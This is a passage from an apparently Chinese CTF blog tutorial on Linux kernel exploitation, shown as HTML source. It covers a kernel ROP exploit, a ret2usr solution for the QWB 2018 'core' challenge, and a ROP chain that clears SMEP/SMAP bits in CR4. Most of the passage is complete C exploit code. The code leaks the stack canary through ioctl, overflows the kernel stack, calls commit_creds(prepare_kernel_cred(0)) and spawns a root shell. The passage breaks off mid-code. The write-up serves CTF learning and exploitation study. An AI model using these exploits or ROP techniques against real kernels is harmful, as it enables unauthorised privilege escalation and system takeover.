class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    fd=open(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-string">&quot;open ko&quot;</span>);<br>    &#125;<br>    save_status();<br>    leak_kernel_base();<br>    seq_pt_regs_rop();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4-1684500595851.png" alt="4"></p><h4 id="0x4其他">0x4其他</h4><p>关于如何调试，寻找rsp与pt_regs的偏移</p><p>就是我们能劫持rip了嘛，那就直接gdb 断点在<code>add rsp,val ;ret</code> 这种gadget的地址</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684500595851.png" alt="5"></p><p>这里偏移为<code>0x1a0</code></p><p>这个gadget是<code>add rsp,0x180;pop rbx;pop r12;pop r13;pop r14;pop rbp;ret</code></p><p>刚好到<code>pop rdi</code> 执行我们布置的rop链</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684500595852.png" alt="6"></p><p>还有就是swapgs_restore_regs_and_return_to_usermode为啥要+9</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684500595852.png" alt="8"></p><p>我们控制到rbp，这里也是要对应起来的</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684500595852.png" alt="7"></p><h2 id="02-ret2usr">02.ret2usr</h2><h3 id="强网杯2018-core">强网杯2018-core</h3><h4 id="NO-SMEP-SMAP：">NO SMEP/SMAP：</h4><p>还是以这题为例，这题qemu启动时没开启smep，除了kernel rop另一种解法就是ret2usr</p><h5 id="0x01差别">0x01差别</h5><p>可以看到，从原本的rop出<code>commit_creds_addr(prepare_kernel_cred_addr(0))</code>变为了直接在内核态调用用户态的<code>commit_creds_addr(prepare_kernel_cred_addr(0))</code></p><p>因为内核态可以以 <code>ring 0</code> 特权执行用户空间代码</p><h5 id="0x02exp">0x02exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    set_off(fd, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    core_read(fd, buf);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br>    <br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        rop[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>    &#125;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>    <br>    rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>    <br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br>    <br>    write(fd, rop, <span class="hljs-number">0x800</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BYPASS-SMEP-SMAP">BYPASS SMEP/SMAP:</h4><h5 id="0x01分析">0x01分析</h5><p>还是以这题为例</p><p>往start.sh加上smap,smep保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-cpu qemu64-v1,+smep,+smap \<br></code></pre></td></tr></table></figure><p>再次运行get_root脚本发现内核报错重启了，因为smep保护,在内核态用户态的代码不可执行</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>内核根据cr4寄存器的第20,21位的值来判断smep保护和smap保护是否开启</p><p>（偷一张图）</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/cr4.png" alt="cr4"></p><p>我们可以通过ROP把smep和smap位置为0，就关掉了保护</p><p><strong>解释下面这一串rop链：</strong></p><p>就是把cr4寄存器赋值给rax</p><p>我们接着把rdi寄存器赋值0xffffffffffcfffff</p><p>rax和rdi寄存器按位与就刚好把20，21位的值变为0了</p><p>相当于把保护关了</p><p>然后我们就可以用<code>(*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));</code>去提权了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff8106669c</span> + offset;<span class="hljs-comment">// mov rax, cr4; test ah, 0x20; jne 0x2666aa; add rsp, 8; pop rbx; ret;</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset;<span class="hljs-comment">// pop rdi; ret;</span><br>rop[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff8102b45b</span> + offset;<span class="hljs-comment">// and rax, rdi; ret;</span><br><br>rop[i++] = <span class="hljs-number">0xffffffff81002515</span> + offset;<span class="hljs-comment">// mov cr4, rax; push rcx; popfq; ret;</span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br></code></pre></td></tr></table></figure><h5 id="0x02exp-2">0x02exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc bypass.c -static -masm=intel -g -o bypass</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br><span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>set_off(fd, <span class="hljs-number">0x40</span>);<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>core_read(fd, buf);<br><span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br><br><span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br>    rop[i] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>&#125;<br>rop[i++] = <span 